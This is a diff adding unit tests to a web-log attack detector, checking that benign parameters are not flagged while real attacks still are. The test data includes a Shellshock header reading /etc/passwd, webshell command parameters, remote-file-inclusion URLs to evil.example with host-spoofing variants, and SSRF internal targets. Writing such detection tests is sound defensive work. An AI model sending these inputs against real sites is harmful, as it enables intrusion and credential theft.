@@ -334,5 +334,32 @@ class ExternalChainTests(unittest.TestCase):
         self.assertIn("WEBLOG_EXPLOIT_PROBE", self._rules(acc(ua="() { :; }; /bin/cat /etc/passwd")))
 
 
+class CommonParamFalsePositiveTests(unittest.TestCase):
+    """흔한 정상 인자를 공격으로 보지 않는다(AIT 정상 트래픽에서 확인한 두 경우)."""
+
+    def _rules(self, path_q, profile=None):
+        line = (f'10.0.0.5 - - [10/Oct/2026:13:55:40 +0000] "GET {path_q} HTTP/1.1" 200 900 "-" "Mozilla/5.0"')
+        return {f.rule for f in webdetect.run_web_detections(weblog.parse_access(line), profile or SiteProfile())}
+
+    def test_numeric_c_param_is_not_command(self):
+        self.assertNotIn("WEBLOG_WEBSHELL_ACCESS", self._rules("/wp-admin/load-scripts.php?c=0&load%5Bchunk_0%5D=jquery"))
+        self.assertIn("WEBLOG_WEBSHELL_ACCESS", self._rules("/uploads/x.php?c=id"))
+        self.assertIn("WEBLOG_WEBSHELL_ACCESS", self._rules("/uploads/x.php?cmd=ls%20-la"))
+
+    def test_redirect_to_own_site_is_not_rfi(self):
+        p = SiteProfile(own_hosts=["shop.example"])
+        q = "/wp-login.php?redirect_to=https%3A%2F%2Fshop.example%2Fwp-admin%2F&reauth=1"
+        self.assertNotIn("WEBLOG_RFI", self._rules(q, p))
+        # 바깥 주소, 우리 이름을 앞에 붙인 바깥 주소, @로 속인 주소는 계속 잡는다
+        for host in ("evil.example", "shop.example.evil.example", "shop.example@evil.example"):
+            self.assertIn("WEBLOG_RFI", self._rules(f"/index.php?page=http://{host}/x.txt", p), host)
+        # 우리 사이트 이름을 모르면 예전처럼 모두 잡는다
+        self.assertIn("WEBLOG_RFI", self._rules(q, SiteProfile(own_hosts=[])))
+        # 우리 것이어도 루프백·내부망 주소는 SSRF 표적이라 계속 잡는다
+        for host in ("127.0.0.1:8081", "localhost", "10.0.1.10"):
+            p2 = SiteProfile(own_hosts=["127.0.0.1", "localhost", "10.0.1.10"])
+            self.assertIn("WEBLOG_RFI", self._rules(f"/fetch.php?url=http://{host}/internal", p2), host)
+
+
 if __name__ == "__main__":
     unittest.main()
